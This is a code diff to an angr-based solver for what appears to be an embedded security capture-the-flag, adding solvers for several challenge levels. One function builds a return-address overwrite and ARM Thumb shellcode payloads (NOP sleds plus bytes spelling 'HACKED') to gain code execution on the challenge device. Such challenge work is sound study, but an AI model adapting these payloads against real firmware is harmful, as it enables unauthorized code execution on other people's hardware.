@@ -389,20 +389,9 @@ class ESCAngr(object):
         self._set_start_symbol("_Z12challenge_106packet")
         addr = self.sym.linked_addr
 
-        for i in self.obj.symbols:
-            if i.demangled_name.startswith("Print::print"):
-                self.proj.hook(i.linked_addr, self.print_hook)
-                print("Hooked %s (0x%08x)" % (i.demangled_name, i.linked_addr))
+        self._hook_prints()
 
-        st = self.proj.factory.blank_state()
-        st.regs.r0 = st.regs.r1 = st.regs.r2 = st.regs.r3 = 0
-        st.regs.r4 = st.regs.r5 = st.regs.r6 = st.regs.r7 = 0
-        st.regs.r8 = st.regs.r9 = st.regs.r10 = st.regs.r11 = 0
-        st.regs.r12 = 0
-        st.options |= set(['SYMBOL_FILL_UNCONSTRAINED_MEMORY'])
-        st.regs.pc = addr
-
-        self.hook_card_read(st)
+        st = self._get_start_state(addr, ['SYMBOL_FILL_UNCONSTRAINED_MEMORY'])
 
         mgr = self.proj.factory.simgr(st)
         mgr.explore(find=[0x11b9])
@@ -526,7 +515,10 @@ class ESCAngr(object):
         mgr.use_technique(angr.exploration_techniques.Explorer(find=[0x876, 0x877], avoid=[0x874,0x875]))
         st.memory.store(WHITE_CARD_START_ADDR, b"\x00"*WHITE_CARD_SZ)#st.solver.BVS('select%d' % i, 8))
 
-        target_pc = self.obj.symbols_by_name["_Z17fillChallengeHashv"].linked_addr
+        #target_pc = self.obj.symbols_by_name["_Z17fillChallengeHashv"].linked_addr
+        #target_pc = 0x8ae+1
+        #target_pc = WHITE_CARD_START_ADDR+0x140+2*20 # FOR TESTING IN ANGR
+        target_pc = 0x1fff976d + 0x110+2*20 # ON DEVICE CODE AREA
         print("[+] Exploit target PC %08x" % target_pc)
 
         payload = b"\x00"*12 + pack("<I", 12) + b"\x00\x00\x00\x00" + pack("<I", target_pc)
@@ -535,6 +527,26 @@ class ESCAngr(object):
         # for each bit that is set, read a byte from the payload
         st.memory.store(WHITE_CARD_START_ADDR+0x100, b"\xff"*3)
         st.memory.store(WHITE_CARD_START_ADDR+0xc0, payload)
+
+
+        from binascii import unhexlify
+        NOP = b"\x00\xbf"
+        # prove code exec: still execute the challenge function with code!
+        payload2 = NOP*0x20 + unhexlify("07 20 1d 21 08 22 90 40 08 43 86 46 70 47".replace(" ",""))
+        #payload3 = NOP*0x20 + unhexlify(" 04 20 b5 21 08 22 90 40 08 43 07 1c 03 a6 30 68 03 a1 b8 47 f3 e7 00 00 00 00 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ",""))
+
+        #payload4 = NOP*0x20 + unhexlify(" 07 20 4b 21 08 22 90 40 08 43 07 1c 02 a1 38 47 f6 e7 00 00 00 00 48 41 43 4b 45 44 00".replace(" ", ""))
+        payload4 = NOP*0x18 + unhexlify(" 07 20 1d 21 08 22 90 40 08 43 06 1c 04 20 b5 21 08 22 90 40 08 43 07 1c 4f 20 90 40 3f 24 20 43 48 21 00 bf b6 46 70 47".replace(" ", ""))
+        payload5 = NOP*0x18 + unhexlify(" 08 a0 06 88 06 a0 07 88 07 a0 00 68 06 a1 00 bf b8 47 b0 47 00 bf fe e7 00 00 00000000 b5 04  00 00 1d 07 34 8e ff 1f 48 41 43 4b 45 44 00".replace(" ", ""))
+	
+
+        payload=payload5
+        
+        #print(len(payload4), payload4)
+        st.memory.store(WHITE_CARD_START_ADDR+0x111, payload)
+
+        st.memory.store(0x1fff976d, b"\x00"*WHITE_CARD_SZ)
+        st.memory.store(0x1fff976d+0x111, payload)
 
         st.memory.store(BUTTON_OFFSET, st.solver.BVS('button', 8))
 
@@ -553,12 +565,143 @@ class ESCAngr(object):
             return
 
         self.print_table(n)
+        mgr2 = self.proj.factory.simgr(s)
+        mgr2.run(n=1)
+        print(mgr2)
+        embed()
+
+    def solve_caesar(self):
+        self._set_start_symbol("_Z12challenge_136packet")
+        addr = self.sym.linked_addr
+
+        self._hook_prints()
+
+        st = self._get_start_state(addr, ['SYMBOL_FILL_UNCONSTRAINED_MEMORY']) 
+        mgr = self.proj.factory.simgr(st)
+        #mgr.use_technique(angr.exploration_techniques.Veritesting())
+
+        for i in range(4):
+            st.memory.store(WHITE_CARD_START_ADDR+0x1a0+i, st.solver.BVS("input%d" % i, 8))
+
+        st.memory.store(BUTTON_OFFSET, st.solver.BVS("button", 8))
+
+        #mgr.explore(find=[0x1b8d, 0x1b8c], avoid=[0x1b4f, 0x1b01, 0x1aaf])
+        embed()
+
+    def solve_steel(self):
+        self._set_start_symbol("_Z12challenge_126packet")
+        addr = self.sym.linked_addr
+
+        self._hook_prints()
+
+        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
+        #st.inspect.b('instruction', when=angr.BP_BEFORE, instruction=0x1785, action=lambda s: embed())
+
+        st.memory.store(WHITE_CARD_START_ADDR+0x191, st.solver.BVS('input', 8*3))
+
+        mgr = self.proj.factory.simgr(st)
+        mgr.explore(find=[0x1796+1])
+
+        s = mgr.found[0]
+
+        s.solver.add(s.memory.load(s.regs.r7+0x8c, 1) == ord(';'))
+
+        self.print_table(s)
+
+        return
+
+        # the below was used for testing to see why this MD5 was different from other MD5s
+        st.memory.store(st.regs.sp+0x200, b"A")
+        st.memory.store(st.regs.sp+0x300, b"\x00"*0x20)
+
+        hash_create = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45HC1Ev"].linked_addr, concrete_only=True, base_state=st)
+        hash_create(st.regs.sp)
+
+        hash_init = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H4InitEv"].linked_addr, concrete_only=True, base_state=hash_create.result_state)
+        hash_init(st.regs.sp)
+
+        hash_update = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H6UpdateEPhj"].linked_addr, concrete_only=True, base_state=hash_init.result_state)
+        hash_update(st.regs.sp, st.regs.sp+0x200, 1)
+
+        hash_final = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H5FinalEv"].linked_addr, concrete_only=True, base_state=hash_update.result_state)
+        hash_final(st.regs.sp)
+        final = hash_final.result_state.memory.load(hash_final.result_state.regs.sp+0x68, 0x20)
+        print(final)
+
+        hash_update2 = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H6UpdateEPhj"].linked_addr, concrete_only=True, base_state=hash_final.result_state)
+        hash_update2(hash_final.result_state.regs.sp, hash_final.result_state.regs.sp+0x68, 0x20)
+
+        hash_final2 = self.proj.factory.callable(self.obj.symbols_by_name["_ZN4H45H5FinalEv"].linked_addr, concrete_only=True, base_state=hash_update2.result_state)
+        hash_final2(st.regs.sp)
+        final2 = hash_final2.result_state.memory.load(hash_final2.result_state.regs.sp+0x68, 0x20)
+        print(final2)
+        embed()
+
+    def solve_spiral(self):
+        self._set_start_symbol("_Z12challenge_146packet")
+        addr = self.sym.linked_addr
+
+        self._hook_prints()
+
+        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
+        mgr = self.proj.factory.simgr(st)
+
+        st.memory.store(WHITE_CARD_START_ADDR+0x18d, st.solver.BVS("input", 8*4))
+        mgr.explore(find=[0x1e05], avoid=[0x1e2b])
+
+        s = mgr.found[0]
+        self.print_table(s)
+
+    def solve_tower(self):
+        self._set_start_symbol("_Z12challenge_156packet")
+        addr = self.sym.linked_addr
+
+        self._hook_prints()
+
+        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
+        st.memory.store(st.regs.sp+0x200, b"AAAABBBB")
+        st.memory.store(st.regs.sp+0x300, b"\x00"*0x20)
+
+        blake_256_init = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_init"].linked_addr, concrete_only=True, base_state=st)
+        blake_256_init(st.regs.sp)
+
+        blake_256_update = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_update"].linked_addr, concrete_only=True, base_state=blake_256_init.result_state)
+        blake_256_update(st.regs.sp, st.regs.sp+0x200, 8)
+
+        blake_256_final = self.proj.factory.callable(self.obj.symbols_by_name["blake_256_final"].linked_addr, concrete_only=True, base_state=blake_256_update.result_state)
+        blake_256_final(st.regs.sp, st.regs.sp+0x300)
+
+        embed()
+
+    def solve_spire(self):
+        self._set_start_symbol("_Z12challenge_176packet")
+        addr = self.sym.linked_addr
+
+        self._hook_prints()
+
+        st = self._get_start_state(addr, ['ZERO_FILL_UNCONSTRAINED_MEMORY']) 
+
+        st.memory.store(WHITE_CARD_START_ADDR+0x280, pack("<I", 0) + pack("<i", -(4*3)))
+        st.memory.store(WHITE_CARD_START_ADDR+0x36f, pack("B", 1))
+        st.memory.store(WHITE_CARD_START_ADDR+0x340, pack("B", 1))
+        st.memory.store(WHITE_CARD_START_ADDR+0x2cf, pack("B", 0))
+        st.memory.store(WHITE_CARD_START_ADDR+0x2c3, pack("<IIIB", 1, 0, 0x1fffa140, 0))
+
+        mgr = self.proj.factory.simgr(st)
+        mgr.run()
+
+        print(self.read_string(mgr.unconstrained[0], 0x1fffa140))
+
+        self.print_table(mgr.unconstrained[0])
+
 
 challenges = {
     "A" : ["stairs", "cafe", "closet", "lounge"],
     "B" : ["dance", "code", "mobile", "blue"],
     "C" : ["uno", "break", "recess", "game"],
     "D" : ["bounce"],
+    "E" : ["steel", "caesar", "spiral", "tower"],
+    "F" : ["spire"],
 }
 
 def main():
